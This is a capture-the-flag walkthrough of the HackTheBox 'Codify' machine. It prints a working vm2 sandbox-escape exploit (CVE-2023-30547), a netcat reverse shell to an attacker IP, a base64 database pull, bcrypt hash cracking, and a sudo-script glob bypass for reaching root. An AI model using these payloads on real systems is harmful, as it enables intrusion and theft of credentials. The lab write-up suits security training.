# Codify - Easy

```sh
sudo vim /etc/hosts
# add codify.htb

nmap -T4 -p- -A -Pn -v codify.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
    * 80/tcp - http - Apache httpd 2.4.52
    * 3000/tcp - http - Node.js Express Framework

* the Codify webpage on port 80 provides a code editor for Node.js code testing; it is a sandbox env

* the page also mentions its limitations:

    * restricted modules:

        * child_process
        * fs
    
    * whitelisted modules:

        * url
        * crypto
        * util
        * evenets
        * assert
        * stream
        * path
        * os
        * zlib

* the page also provides an administrator email - 'support@codify.htb', and mentions that their ticketing system is being migrated

* the about section of the page discloses the tool used for the sandboxing env - vm2 library, version 3.9.16

* Googling for exploits associated with vm2 3.9.16 gives us [CVE-2023-30547](https://github.com/advisories/GHSA-ch3r-j5x3-6q2m), a sandbox escape vulnerability that can be used to get RCE

* we can use the [linked PoC for CVE-2023-30547](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244):

    ```sh
    sudo tcpdump -i tun0 icmp
    # listen for ping packets
    ```

    ```js
    const {VM} = require("vm2");
    const vm = new VM();

    const code = `
    err = {};
    const handler = {
        getPrototypeOf(target) {
            (function stack() {
                new Error().stack;
                stack();
            })();
        }
    };
    
    const proxiedErr = new Proxy(err, handler);
    try {
        throw proxiedErr;
    } catch ({constructor: c}) {
        c.constructor('return process')().mainModule.require('child_process').execSync('ping -c 4 10.10.14.23');
    }
    `

    console.log(vm.run(code));
    ```

* when we run the PoC code in the Node.js editor, we can see ping packets hitting our listener, and the output is also shown in the editor

* we can use this to get a reverse shell now - we can use the payload ```busybox nc 10.10.14.23 4444 -e bash``` in the PoC code:

    ```sh
    nc -nvlp 4444

    # once we run the exploit code, we get reverse shell

    id
    # 'svc'

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z to bg shell
    stty raw -echo; fg
    # press Enter twice

    pwd
    # '/home/svc'

    ls -la /home
    # we have another user 'joshua'

    ls -la /home/joshua
    # access denied

    ls -la
    # enumerate svc user files

    ls -la .pm2
    # check the non-default directory
    # pm2 is a process manager for node.js apps

    cat .pm2/dump.pm2
    # check the files for any secrets
    # it is a JSON file

    which jq
    # target does not have 'jq' installed
    # we can copy the output to our machine to view JSON output

    # check other files in .pm2 directory
    # they do not contain anything useful

    ls -la /
    # continue enumeration

    ls -la /var/www
    # check web files

    ls -la /var/www/contact
    # this includes a 'tickets.db' file

    # transfer the DB file to attacker

    md5sum /var/www/contact/tickets.db
    # check MD5 hash

    cat /var/www/contact/tickets.db | base64 -w 0; echo
    # convert to base64
    ```

    ```sh
    # on attacker
    echo -n "<base64-encoded-data>" | base64 -d > tickets.db

    md5sum tickets.db
    # verify MD5 hash

    sqlitebrowser tickets.db
    ```

* from the 'tickets.db' file, in the 'users' table, we get the hash for 'joshua'

* the hash is in bcrypt format, mode 3200 in ```hashcat``` - we can try to crack it:

    ```sh
    hashcat -a 0 -m 3200 joshuahash /usr/share/wordlists/rockyou.txt --force
    ```

* ```hashcat``` cracks this to give plaintext 'spongebob1' - we can use this to login as 'joshua' via SSH:

    ```sh
    ssh joshua@codify.htb

    cat user.txt
    # user flag

    sudo -l
    # this shows we can run a script as sudo
    ```

* ```sudo -l``` shows that we can run ```/opt/scripts/mysql-backup.sh``` as sudo - we can check the script further:

    ```sh
    ls -la /opt/scripts/mysql-backup.sh
    # we have read access, but no write access

    cat /opt/scripts/mysql-backup.sh
    ```

    ```sh
    #!/bin/bash
    DB_USER="root"
    DB_PASS=$(/usr/bin/cat /root/.creds)
    BACKUP_DIR="/var/backups/mysql"

    read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
    /usr/bin/echo

    if [[ $DB_PASS == $USER_PASS ]]; then
            /usr/bin/echo "Password confirmed!"
    else
            /usr/bin/echo "Password confirmation failed!"
            exit 1
    fi

    /usr/bin/mkdir -p "$BACKUP_DIR"

    databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

    for db in $databases; do
        /usr/bin/echo "Backing up database: $db"
        /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
    done

    /usr/bin/echo "All databases backed up successfully!"
    /usr/bin/echo "Changing the permissions"
    /usr/bin/chown root:sys-adm "$BACKUP_DIR"
    /usr/bin/chmod 774 -R "$BACKUP_DIR"
    /usr/bin/echo 'Done!'
    ```

    * the script refers the password for 'root' from ```/root/.creds``` and the backup directory is set to ```/var/backups/mysql```

    * the user is prompted to re-enter the MySQL password, to check if the password entered matches the root creds or not - the script proceeds only if the passwords match

    * then, it connects to the MySQL server, excludes the default DBs, and takes a backup of the non-default DBs

    * the DBs are exported using ```mysqldump```, and ```gzip``` is used to compress the exported DB files in '.sql.gz' format

    * at the end, the script changes the owner of the backup directory to 'root' (user) & 'sys-adm' (group), and permissions to read-only for other users

* checking the script, we do not have any way to read the password values from process info of ```mysqldump``` (for example) since the initial check itself determines whether the execution will continue or not

* however, in the initial check, unquoted bash variable comparison is happening:

    ```sh
    if [[ $DB_PASS == $USER_PASS ]]; then
    ```

* [this is an issue with glob pattern matching](https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells#answer-171347), and the script does not test if the values are equal, but if the pattern is matching

* so, to bypass this, the wildcard character ```*``` can be used and the condition would still succeed as pattern-matching is considered, since the variables are not enclosed in quotes

* so, once we use the wildcard character ```*``` in the prompt, we can use ```pspy``` to get the background process info, and read the ```DB_PASS``` value that is being passed as an argument for ```mysql``` & ```mysqldump```:

    ```sh
    ssh joshua@codify.htb
    # establish a new SSH session for pspy

    # fetch pspy from attacker
    wget http://10.10.14.23:8000/pspy64
    chmod +x pspy64
    ./pspy64
    ```

    ```sh
    # in initial SSH session
    # we can use '*' in the prompt to match the pattern
    sudo /opt/scripts/mysql-backup.sh
    ```

* ```pspy``` captures the cleartext password for 'root' once the script is executed & the prompt is submitted

* we can now login as 'root':

    ```sh
    su root
    # switch to root

    cat /root/root.txt
    # root flag
    ```
